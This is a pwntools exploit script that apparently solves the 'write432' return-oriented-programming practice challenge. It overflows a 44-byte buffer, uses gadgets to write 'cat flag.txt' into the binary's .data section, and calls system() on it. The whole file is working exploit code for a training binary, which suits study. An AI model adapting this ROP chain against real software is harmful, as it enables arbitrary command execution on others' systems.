import sys; sys.path.append("../..")
import shared_pwn
from pwn import *
import re

BINARY_NAME = "write432"
BUFFER_LEN = 44

elf = ELF(f"./{BINARY_NAME}")

# print(elf.symbols)
# system_func = elf.symbols["usefulFunction"]+14


junk = b"\x90" * BUFFER_LEN

def write_string_to_memory(start_addr, string_data, g_bundle):

    # Pads the string
    required = abs((len(string_data) % 4) - 4)
    string_data += " " * required

    # Split the string into sets of 4
    chunks = re.findall(r"....", string_data)

    # Writes data to memory
    payload = b""
    for c in chunks:
        payload += g_bundle
        payload += p32(start_addr)
        payload += str.encode(c)

        # Increment the address each time
        start_addr += 4

    return payload


# Pointers
string_location = 0x0804a028 # readelf -x .data write432
g_pop_pop       = p32(0x080486da) # pop edi ; pop ebp ; ret
g_mov           = p32(0x0804866f) # nop ; mov dword ptr [edi], ebp ; ret
system_func     = p32(0x08048430)

g_bundle = g_pop_pop + g_mov

# Payload creation
payload = b""
payload += junk
payload += write_string_to_memory(string_location, "cat flag.txt", g_bundle) 
payload += system_func
payload += p32(string_location)

io = elf.process()
io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)